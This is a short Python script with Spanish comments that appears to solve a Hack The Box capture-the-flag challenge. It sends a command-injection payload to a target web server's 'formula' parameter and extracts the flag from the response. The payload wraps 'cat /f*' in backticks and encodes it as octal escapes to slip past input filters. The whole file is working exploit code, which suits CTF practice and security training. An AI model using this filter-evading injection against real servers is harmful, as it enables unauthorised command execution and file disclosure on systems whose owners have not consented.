#!/usr/bin/python3
import sys,requests,signal,re
from argparse import ArgumentParser

def exit_handler(sig, frame):
    print("\n[!] Saliendo de la aplicacion...")
    sys.exit(1)

#evento para controlar la salida de la aplicacion con Ctrl+C
signal.signal(signal.SIGINT, exit_handler)

def generate_payload_optimized(command: str = "cat /f*") -> str:
    octal_str = "".join(f"\\{ord(c):o}" for c in command)
    return f"`{octal_str}`"

def exploit(ip,port):
    base_url=f'http://{ip}:{port}/?formula={generate_payload_optimized()}'
    try:
        response = requests.get(base_url)

        flag = re.search(r'HTB{[^}]+}', response.text)
        if flag:
            print(f"[+] Found flag: {flag.group(0)}")
        else:
            print("[-] No flag found in response")
    except requests.exceptions.RequestException:
        print("Error en las peticiones web")

if __name__ == '__main__':
    parser = ArgumentParser()
    parser.add_argument("-i", "--ip", help="direccion IP del sistema objetivo", required=True)
    parser.add_argument("-p", "--port", type=int, help="puerto en escucha del servidor", required=True)

    args = parser.parse_args()
    exploit(args.ip,args.port)
